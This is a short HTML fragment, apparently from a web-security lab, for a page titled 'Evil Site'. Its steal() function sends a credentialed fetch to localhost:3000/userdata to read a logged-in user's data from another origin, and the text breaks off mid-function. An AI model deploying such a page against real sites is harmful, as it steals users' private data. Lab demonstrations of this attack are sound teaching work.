<!DOCTYPE html>
<html>
<head><title>Evil Site</title></head>
<body>
  <h1>evil.com clone</h1>

  <pre id="output"></pre>

  <script>
    function steal() {
      fetch('http://localhost:3000/userdata', {
        credentials: 'include'
      })
